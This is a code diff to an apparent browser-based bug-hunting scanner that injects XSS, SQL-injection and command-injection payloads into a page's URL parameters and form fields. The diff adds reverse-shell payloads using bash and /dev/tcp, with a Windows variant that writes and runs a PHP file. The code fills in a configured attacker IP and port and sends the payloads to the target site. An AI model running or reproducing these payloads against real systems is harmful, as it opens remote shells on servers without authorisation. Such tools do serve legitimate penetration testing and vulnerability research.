@@ -16,6 +16,8 @@ function JsBugHuntingHelper () {
   this.formFuzzingEnabled = false
   // extensions have a special object called wrappedJSObject to get the original properties of the browser
   this.originalWinObj = {}
+  this.attackerIp = ''
+  this.attackerPort = ''
 
   const payloadsXSS = [
     '<script>alert("XSS_VULNERABLE_PARAM")</script>',
@@ -30,17 +32,28 @@ function JsBugHuntingHelper () {
     'test" || echo TEST_RCE > /var/www/testRCE.php || "',
     '"+%26%26+echo+TEST_RCE+%26%26+"',
     '" && echo TEST_RCE && "',
-    'echo TEST_RCE'
+    'echo TEST_RCE',
+    '1" && echo TEST_RCE #',
+    /* Linux payload */
+    '1" || /bin/bash -c \'bash -i >& /dev/tcp/[ATTACKERIP]/[ATTACKERPORT] 0>&1\' #',
+    // '1" || /bin/bash -c \'bash -i >& /dev/tcp/[ATTACKERIP]/[ATTACKERPORT] 0>&1\'',
+    /* Windows payload */
+    '1" && echo ^<?php > file2.php && echo $cmd=^"bash.exe -c \\"bash.exe -i >& /dev/tcp/[ATTACKERIP]/[ATTACKERPORT] 0>&1\\"^"; >> file2.php && echo exec($cmd); >> file2.php && echo ?^> >> file2.php && php file2.php #'
+    // '1" && echo ^<?php > file2.php && echo $cmd=^"bash.exe -c \\"bash.exe -i >& /dev/tcp/[ATTACKERIP]/[ATTACKERPORT] 0>&1\\"^"; >> file2.php && echo exec($cmd); >> file2.php && echo ?^> >> file2.php && php file2.php'
+    // '1" && echo ^<?php > file2.php && echo $cmd=^"bash.exe -c "bash.exe -i >& /dev/tcp/[ATTACKERIP]/[ATTACKERPORT] 0>&1"^"; >> file2.php && echo exec($cmd); >> file2.php && echo ?^> >> file2.php && php file2.php #',
+    // '1" && echo ^<?php > file2.php && echo $cmd=^"bash.exe -c \\"bash.exe -i >& /dev/tcp/[ATTACKERIP]/[ATTACKERPORT] 0>&1\\"^"; >> file2.php && echo exec($cmd); >> file2.php && echo ?^> >> file2.php && php file2.php #'
   ]
 
   // eslint-disable-next-line no-multiple-empty-lines
   // eslint-disable-next-line no-unused-vars
   // @return void
-  this.init = async function (xssScanEnabled, sqlInjectionScanEnabled, rceScanEnabled, formFuzzingEnabled) {
+  this.init = async function (xssScanEnabled, sqlInjectionScanEnabled, rceScanEnabled, formFuzzingEnabled, attackerIp, attackerPort) {
     this.xssScanEnabled = xssScanEnabled
     this.sqlInjectionScanEnabled = sqlInjectionScanEnabled
     this.rceScanEnabled = rceScanEnabled
     this.formFuzzingEnabled = formFuzzingEnabled
+    this.attackerIp = attackerIp
+    this.attackerPort = attackerPort
 
     console.log('Created by Davide Cavallini')
     console.log('Linkedin: https://www.linkedin.com/in/davidecavallini/')
@@ -56,7 +69,7 @@ function JsBugHuntingHelper () {
 
     // console.log(window.wrappedJSObject)
 
-    window.wrappedJSObject !== undefined ? this.originalWinObj = window.wrappedJSObject : originalWinObj = window
+    window.wrappedJSObject !== undefined ? this.originalWinObj = window.wrappedJSObject : this.originalWinObj = window
 
     recursiveEnumerate(this.originalWinObj, 0).forEach((v) => {
       console.log(v.description, v.function, v.declaration)
@@ -124,7 +137,7 @@ function JsBugHuntingHelper () {
     }
     if (this.rceScanEnabled === true) {
       console.log('URL RCE Vulnerabilities'.toUpperCase())
-      const rce = await testRCE()
+      const rce = await testRCE.call(this)
       console.log(rce)
       console.log('----------------------------------------------------------------------------')
       console.log('\n')
@@ -529,18 +542,26 @@ function JsBugHuntingHelper () {
       for (const payload of payloadsRCE) {
         const paramsEntities = Object.entries(getAllUrlParams(document.location.href))
         const v = paramsEntities[i]
-        v[1] = v[1] + payload
+        v[1] = v[1] + payload.replace('[ATTACKERIP]', this.attackerIp).replace('[ATTACKERPORT]', this.attackerPort)
 
         const mod = paramsEntities.map((v) => {
           return v[0] + '=' + v[1]
         })
 
         const newUrl = document.location.origin + document.location.pathname + '?' + mod.join('&')
+        const newUrl2 = document.location.origin + document.location.pathname
         // console.log(newUrl)
 
         // eslint-disable-next-line no-undef
         try {
           await $.get(newUrl).done(function (data) {
+            if (data.indexOf('TEST_RCE') !== -1 && data.indexOf('echo+TEST_RCE') === -1 && data.indexOf('echo TEST_RCE') === -1 && data.indexOf('\'TEST_RCE\'') === -1) {
+              result.push({ paramName: v[0], type: 'RCE via Url', url: newUrl })
+            }
+          })
+
+          // richiesta un po diversa via ajax
+          await $.get(newUrl2, Object.fromEntries(paramsEntities)).done(function (data) {
             if (data.indexOf('TEST_RCE') !== -1 && data.indexOf('echo+TEST_RCE') === -1 && data.indexOf('echo TEST_RCE') === -1 && data.indexOf('\'TEST_RCE\'') === -1) {
               result.push({ paramName: v[0], type: 'RCE via Url', url: newUrl })
             }
@@ -573,18 +594,31 @@ function JsBugHuntingHelper () {
     // eslint-disable-next-line no-undef
     // probabilmente il problema è questo async
     for (const form of Q('form')) {
-      const originalParamsLength = $(form).find('input,button,select,checkbox').length
+      const originalParamsLength = $(form).find('input,button,select,textarea').length
 
       if (this.xssScanEnabled === true) {
         for (let i = 0; i < originalParamsLength; i++) {
           for (const payload of payloadsXSS) {
             const tempParams = []
             // eslint-disable-next-line no-undef
-            $(form).find('input,button,select,checkbox').each((i2, v2) => {
+            $(form).find('input,button,select,textarea').each((i2, v2) => {
               if ($(v2).attr('name') !== undefined && $(v2).attr('name') !== 'undefined' && $(v2).attr('name') !== '') {
                 // eslint-disable-next-line no-undef
                 // console.log($(v2).attr('name'), $(v2).val())
-                tempParams.push({ name: $(v2).attr('name'), value: $(v2).val() })
+                const tagName = $(v2)[0].tagName
+                let value = ''
+
+                if (tagName === 'SELECT') {
+                  value = $(v2).find('option:selected').val()
+                } else if (tagName === 'INPUT') {
+                  const type = $(v2).attr('type').toLowerCase()
+                  if (type === 'checkbox' || type === 'radio') {
+                    value = $(v2).prop('checked').toString()
+                  } else {
+                    value = $(v2).val()
+                  }
+                }
+                tempParams.push({ name: $(v2).attr('name'), value })
               }
             })
             // console.log(tempParams, i, tempParams.length)
@@ -601,11 +635,24 @@ function JsBugHuntingHelper () {
           for (const payload of payloadsSQLi) {
             const tempParams = []
             // eslint-disable-next-line no-undef
-            $(form).find('input,button,select,checkbox').each((i2, v2) => {
+            $(form).find('input,button,select,textarea').each((i2, v2) => {
               if ($(v2).attr('name') !== undefined && $(v2).attr('name') !== 'undefined' && $(v2).attr('name') !== '') {
                 // eslint-disable-next-line no-undef
                 // console.log($(v2).attr('name'), $(v2).val())
-                tempParams.push({ name: $(v2).attr('name'), value: $(v2).val() })
+                const tagName = $(v2)[0].tagName
+                let value = ''
+
+                if (tagName === 'SELECT') {
+                  value = $(v2).find('option:selected').val()
+                } else if (tagName === 'INPUT') {
+                  const type = $(v2).attr('type').toLowerCase()
+                  if (type === 'checkbox' || type === 'radio') {
+                    value = $(v2).prop('checked').toString()
+                  } else {
+                    value = $(v2).val()
+                  }
+                }
+                tempParams.push({ name: $(v2).attr('name'), value })
               }
             })
             if (tempParams[i] !== undefined) {
@@ -621,15 +668,28 @@ function JsBugHuntingHelper () {
           for (const payload of payloadsRCE) {
             const tempParams = []
             // eslint-disable-next-line no-undef
-            $(form).find('input,button,select,checkbox').each((i2, v2) => {
+            $(form).find('input,button,select,textarea').each((i2, v2) => {
               if ($(v2).attr('name') !== undefined && $(v2).attr('name') !== 'undefined' && $(v2).attr('name') !== '') {
                 // eslint-disable-next-line no-undef
                 // console.log($(v2).attr('name'), $(v2).val())
-                tempParams.push({ name: $(v2).attr('name'), value: $(v2).val() })
+                const tagName = $(v2)[0].tagName
+                let value = ''
+
+                if (tagName === 'SELECT') {
+                  value = $(v2).find('option:selected').val()
+                } else if (tagName === 'INPUT') {
+                  const type = $(v2).attr('type').toLowerCase()
+                  if (type === 'checkbox' || type === 'radio') {
+                    value = $(v2).prop('checked').toString()
+                  } else {
+                    value = $(v2).val()
+                  }
+                }
+                tempParams.push({ name: $(v2).attr('name'), value })
               }
             })
             if (tempParams[i] !== undefined) {
-              tempParams[i].value += payload
+              tempParams[i].value += payload.replace('[ATTACKERIP]', this.attackerIp).replace('[ATTACKERPORT]', this.attackerPort)
               result.push(await sendFormRequest.call(this, form, tempParams, 'RCE', tempParams[i].name))
             }
           }
@@ -645,7 +705,7 @@ function JsBugHuntingHelper () {
     const context = this
     // eslint-disable-next-line no-undef
     let url = $('form').attr('action')
-    if (url === '') {
+    if (url === undefined || url === '') {
       url = this.originalWinObj.location.href
     } else if (url.substr(0, 4) !== 'http') {
       let b = this.originalWinObj.location.href.split('/').slice(0, -1).join('/')
@@ -654,6 +714,9 @@ function JsBugHuntingHelper () {
       }
       url = b + url
     }
+
+    // console.log(url, params)
+
     // eslint-disable-next-line no-undef
     if ($(form).attr('method') === 'POST' || $(form).attr('method') === 'post' || $(form).attr('method') === '$_POST' || $(form).attr('method') === '$_post') {
       // eslint-disable-next-line no-undef
@@ -677,7 +740,7 @@ function JsBugHuntingHelper () {
             if (context.rceScanEnabled === true) {
               if (data.indexOf('TEST_RCE') !== -1 && data.indexOf('echo+TEST_RCE') === -1 && data.indexOf('echo TEST_RCE') === -1 && data.indexOf('\'TEST_RCE\'') === -1) {
                 result = { paramName: modifiedParam, type: 'RCE via POST Form', params }
-              // console.log('Parametro GET "' + modifiedParam + '" Vulnerabile ad SQL Injection')
+                // console.log('Parametro GET "' + modifiedParam + '" Vulnerabile ad SQL Injection')
               }
             }
           }
